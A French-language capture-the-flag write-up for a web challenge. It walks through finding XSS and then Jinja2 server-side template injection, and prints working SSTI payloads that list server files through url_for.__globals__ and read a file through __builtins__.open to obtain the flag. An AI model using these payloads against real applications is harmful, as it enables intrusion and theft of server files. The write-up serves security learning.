* * * * *
                             Ginger Oh Jinja!
* * * * *

**Enoncé:** [Lien de l'epreuve](http://hackerlab.bj:5000)

Ouvrons le lien dans un nouvel onglet. Il y a un formulaire sur la page nous demandant notre code name:
```html
<!DOCTYPE html
<html>
	<body>
		<form action="/" method="post"> 
			Your code name cyber-amazone!<br>  
			<input type="text" name="name" value="">  
			<input type="submit" value="Submit">  
		</form>
		<h2>Hello ! </h2>
	</body>
</html>
```

Quand on rentre un mot au hasard, ça a l'air de nous reformater cela:

==Ex:==  **Hello  n34r!**

Essayons d'entrer un code javascript comme:
```javascript
<script> alert("hallo")</script>
``` 
On a effectivement notre popup alerte qui affiche `hallo`. Cela nous fais donc penser à une faille **XSS**. Peut être aussi avec du code [**Jinja2**](https://jinja.palletsprojects.com/en/2.10.x/). Essayons d'injecter: 
```jinja2
{{ 5 * 5 }}
```
Cela affiche **Hello 25!** sur la page
Et oui ça marche, nous avons affaire donc à du **SSTI (Server Side Template Injection)**   [**Voir plus**](https://portswigger.net/research/server-side-template-injection). 
Essayons maintenant de lister les fichiers contenus dans le répertoire courant du code source du serveur. Pour cela nous allons injecter le code suivant:

```jinja2
{{ url_for.__globals__.os.__dict__.listdir('.') }}
```
Après cela nous avons ceci à l'écran:

**Hello ['frferfrflag.txt', 'requirements.sh', 'server.py', 'run.sh']!**

Nous avons donc la liste des fichiers contenus dans le répertoire courant. Le fichier **frferfrflag.txt** attire notre attention, il pourrait contenir le flag. Nous allons lire son contenu. Pour cela injectons ce code:

```jinja2
{{ url_for.__globals__.__builtins__.open('frferfrflag.txt').read() }}
```
Après cela nous avons ceci à l'écran:

 **Hello CTF_TemplateBestInjector !** 
 Et bingo nous avons le flag:  **CTF_TemplateBestInjector**

